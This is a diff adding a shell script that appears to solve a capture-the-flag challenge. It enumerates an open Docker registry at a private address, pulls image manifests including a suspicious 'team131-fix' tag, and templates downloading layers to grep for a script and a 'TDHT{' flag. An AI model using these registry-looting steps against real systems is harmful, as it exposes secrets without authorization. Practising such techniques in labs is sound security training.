@@ -1,0 +1,69 @@
+# STOLEN SCHEMATICS - Proper Registry Layer Extraction
+# Step-by-step manual extraction to find sync-loop.sh
+
+echo "=========================================="
+echo "STEP 1: Enumerate tags properly"
+echo "=========================================="
+
+curl -s http://172.27.0.1:5000/v2/_catalog
+
+echo -e "\n--- Watcher tags ---"
+curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-watcher/tags/list
+
+echo -e "\n--- Diagnostic tags ---"
+curl -s http://172.27.0.1:5000/v2/infra/stolen-schematics-diagnostic/tags/list
+
+echo -e "\n--- Infra tags ---"
+curl -s http://172.27.0.1:5000/v2/infra/stolen-schematics/tags/list
+
+echo -e "\n--- Gameserver tags ---"
+curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-gameserver/tags/list
+
+echo -e "\n--- Prerelease tags ---"
+curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-game-server-prerelease/tags/list
+
+echo -e "\n=========================================="
+echo "STEP 2: Pull watcher v1 manifest"
+echo "=========================================="
+
+curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-watcher/manifests/v1 \
+  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
+  -H "Accept: application/vnd.oci.image.manifest.v1+json"
+
+echo -e "\n=========================================="
+echo "STEP 3: Pull team131-fix manifest (SUSPICIOUS!)"
+echo "=========================================="
+
+curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-watcher/manifests/team131-fix \
+  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
+  -H "Accept: application/vnd.oci.image.manifest.v1+json"
+
+echo -e "\n=========================================="
+echo "READY FOR STEP 4: Extract layers"
+echo "Run the commands below with actual digest values"
+echo "=========================================="
+
+cat << 'EXTRACT_TEMPLATE'
+
+# STEP 4 TEMPLATE (replace <DIGEST> with actual values from Step 2/3):
+
+mkdir -p /tmp/watcher && cd /tmp/watcher
+
+# For each layer digest from the manifest:
+curl -s http://172.27.0.1:5000/v2/images/stolen-schematics-watcher/blobs/sha256:<DIGEST> -o layer1.tar.gz
+
+# List contents first
+tar -tzf layer1.tar.gz | grep -E "(sync|flag|TDHT)" | head -20
+
+# Extract
+mkdir -p extracted1
+tar -xzf layer1.tar.gz -C extracted1 2>/dev/null || gunzip -c layer1.tar.gz | tar -x -C extracted1 2>/dev/null
+
+# Find sync-loop.sh
+find extracted1 -name "*sync*" -o -name "*flag*" 2>/dev/null
+cat extracted1/opt/mc/scripts/sync-loop.sh 2>/dev/null
+
+# Search for flag in all extracted files
+grep -r "TDHT{" extracted1/ 2>/dev/null
+
+EXTRACT_TEMPLATE
